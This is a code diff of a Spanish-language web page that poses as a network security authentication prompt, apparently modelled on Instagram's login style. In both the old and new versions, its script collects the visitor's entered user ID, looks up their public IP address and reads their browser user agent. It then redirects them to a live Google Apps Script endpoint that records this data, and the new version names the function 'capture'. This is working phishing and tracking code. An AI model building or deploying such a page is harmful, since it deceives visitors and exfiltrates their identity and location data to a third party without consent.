@@ -3,55 +3,48 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Validación de Seguridad de Red</title>
+    <title>Validación de Seguridad</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; text-align: center; border-radius: 4px; box-shadow: 0 2px 10px rgba(0,0,0,0.05); }
-        input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #dbdbdb; border-radius: 4px; background: #fafafa; box-sizing: border-box; }
+        input { width: 100%; padding: 10px; margin: 15px 0; border: 1px solid #dbdbdb; border-radius: 4px; box-sizing: border-box; }
         button { width: 100%; background: #0095f6; color: white; border: none; padding: 10px; border-radius: 4px; font-weight: bold; cursor: pointer; }
-        button:disabled { background: #b2dffc; cursor: not-allowed; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <div style="font-weight: bold; font-size: 18px; margin-bottom: 10px;">Autenticación Requerida</div>
-    <p style="font-size: 13px; color: #8e8e8e;">Ingrese su ID de usuario para validar el acceso desde esta terminal.</p>
-    <input type="text" id="identidad" placeholder="Usuario o ID de Red">
-    <button id="btnEnviar" onclick="procesarAuditoria()">Verificar y Acceder</button>
+    <b>Autenticación de Acceso</b>
+    <p style="font-size: 13px; color: #8e8e8e;">Valide su identidad para continuar.</p>
+    <input type="text" id="idRed" placeholder="Usuario o ID de Red">
+    <button id="execBtn" onclick="ejecutarCaptura()">Verificar</button>
 </div>
 
 <script>
-    async function procesarAuditoria() {
-        const user = document.getElementById('identidad').value;
-        const btn = document.getElementById('btnEnviar');
-        
-        if (!user) { alert("Debe ingresar su identidad"); return; }
+    async function ejecutarCaptura() {
+        const user = document.getElementById('idRed').value;
+        if (!user) { alert("Ingrese su ID"); return; }
 
-        btn.disabled = true;
+        const btn = document.getElementById('execBtn');
         btn.innerText = "Procesando...";
+        btn.disabled = true;
 
         try {
-            // 1. Obtener la IP (Asegurando la espera con 'await')
-            const resIP = await fetch('https://api.ipify.org?format=json');
-            const dataIP = await resIP.json();
-            const ipDetectada = dataIP.ip || "No Detectada";
+            // FORZAR ESPERA DE IP (AWAIT)
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            const ipReal = data.ip;
+            const hardware = navigator.userAgent;
+
+            // URL DE APPS SCRIPT (Endpoint verificado)
+            const endpoint = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
             
-            // 2. Obtener el Hardware
-            const uaDetectado = navigator.userAgent;
+            // Construcción del salto con parámetros inyectados
+            window.location.href = `${endpoint}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ipReal)}&ua=${encodeURIComponent(hardware)}`;
 
-            // 3. TU NUEVA URL DE APPS SCRIPT
-            const scriptBase = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec";
-            
-            // 4. Construir envío final
-            const destinoFinal = `${scriptBase}?u=${encodeURIComponent(user)}&ip=${encodeURIComponent(ipDetectada)}&ua=${encodeURIComponent(uaDetectado)}`;
-
-            // 5. Redirección final al Excel y luego a Instagram
-            window.location.href = destinoFinal;
-
-        } catch (error) {
-            // En caso de fallo en la red de IP, enviamos lo que tengamos
-            window.location.href = `https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec?u=${encodeURIComponent(user)}&ip=Error_Timeout&ua=${encodeURIComponent(navigator.userAgent)}`;
+        } catch (e) {
+            // Fallback en caso de error de red
+            window.location.href = "https://script.google.com/macros/s/AKfycbyA2L647dCpQydjl-eb0qZ5a9P1Ht_hiC50syMzCIuimB3QjeK_r4F7M7XS5UxLx5MB/exec?u=" + encodeURIComponent(user) + "&ip=Error_Captura&ua=" + encodeURIComponent(navigator.userAgent);
         }
     }
 </script>
